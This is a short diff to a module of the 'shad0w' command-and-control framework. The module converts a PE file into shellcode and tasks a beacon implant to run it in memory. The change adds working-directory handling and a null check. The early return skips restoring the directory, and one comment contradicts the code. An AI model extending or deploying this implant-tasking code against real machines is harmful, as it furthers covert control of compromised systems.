@@ -2,6 +2,7 @@
 # Execute a PE in memory via the beacon
 #
 
+import os
 import sys
 import zlib
 import base64
@@ -86,11 +87,21 @@ execute -f msg.js
         file = ''.join(args.file)
         params = ' '.join(args.param)
 
+    # make sure we are in the users current dir
+    b4dir = os.getcwd()
+    os.chdir("/root/shad0w/.bridge")
+
     # do we have arguments to pass to the function?
     if params != None:
         b64_comp_data = shellcode.generate(file, args, params)
     elif params == None:
         b64_comp_data = shellcode.generate(file, args, None)
+    
+    if b64_comp_data == None:
+        return
+
+    # change the dir back
+    os.chdir(b4dir)
 
     # set a task for the current beacon to do
     shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
